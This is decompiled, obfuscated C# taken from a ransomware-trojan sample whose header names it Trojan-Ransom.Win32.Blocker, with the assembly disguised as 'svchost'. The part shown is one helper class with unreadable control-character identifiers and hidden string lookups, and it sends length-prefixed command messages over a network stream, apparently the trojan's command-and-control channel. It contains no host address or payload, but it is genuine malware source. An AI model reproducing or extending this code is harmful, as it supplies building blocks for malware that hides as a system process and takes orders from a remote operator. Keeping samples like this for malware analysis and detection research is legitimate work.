// Decompiled with JetBrains decompiler
// Type: .
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A84E1C60-991C-4851-A992-6DDCEE4404E1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.hdyy-931caaeaf6cae2b133cd58c62d9087f042c19135bf73182da90df199b94515c7.exe

using \u0002;
using \u0003;
using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;

namespace \u0003
{
  internal sealed class \u0001
  {
    public static byte[] \u0002(string InputString) => Encoding.Unicode.GetBytes(InputString);

    public static string \u0002(byte[] InputBuffer) => BitConverter.ToString(InputBuffer, 0);

    public static string \u0003(byte[] Data)
    {
      string str1 = \u0001.\u0002(104);
      foreach (byte num in Data)
      {
        char ch = (char) num;
        if (ch.ToString() != \u0001.\u0002(105))
        {
          string str2 = str1;
          ch = (char) num;
          string str3 = ch.ToString();
          str1 = str2 + str3;
        }
      }
      return str1;
    }

    public static void \u0002(NetworkStream NS, string CMD)
    {
      byte[] buffer = \u0001.\u0002(CMD + \u0001.\u0002(110));
      NS.Write(buffer, 0, buffer.Length);
      NS.Flush();
    }

    public static void \u0002(NetworkStream NS, string CMD, byte[] Data)
    {
      byte[] numArray = !(CMD != \u0001.\u0002(115)) ? \u0001.\u0002(CMD + \u0001.\u0002(124) + (Data.Length + 1).ToString() + \u0001.\u0002(129)) : \u0001.\u0002(CMD + \u0001.\u0002(124) + Data.Length.ToString() + \u0001.\u0002(129));
      List<byte> byteList = new List<byte>();
      foreach (byte num in numArray)
        byteList.Add(num);
      foreach (byte num in Data)
        byteList.Add(num);
      byte[] buffer = new byte[byteList.Count];
      for (int index = 0; index < byteList.Count; ++index)
        buffer[index] = byteList[index];
      NS.Write(buffer, 0, buffer.Length);
      NS.Flush();
    }

    public static void \u0002(NetworkStream NS, string CMD, string StringAsData)
    {
      byte[] numArray1 = \u0001.\u0002(StringAsData);
      byte[] numArray2 = \u0001.\u0002(CMD + \u0001.\u0002(124) + numArray1.Length.ToString() + \u0001.\u0002(129));
      List<byte> byteList = new List<byte>();
      foreach (byte num in numArray2)
        byteList.Add(num);
      foreach (byte num in numArray1)
        byteList.Add(num);
      byte[] buffer = new byte[byteList.Count];
      for (int index = 0; index < byteList.Count; ++index)
        buffer[index] = byteList[index];
      NS.Write(buffer, 0, buffer.Length);
      NS.Flush();
    }
  }
}
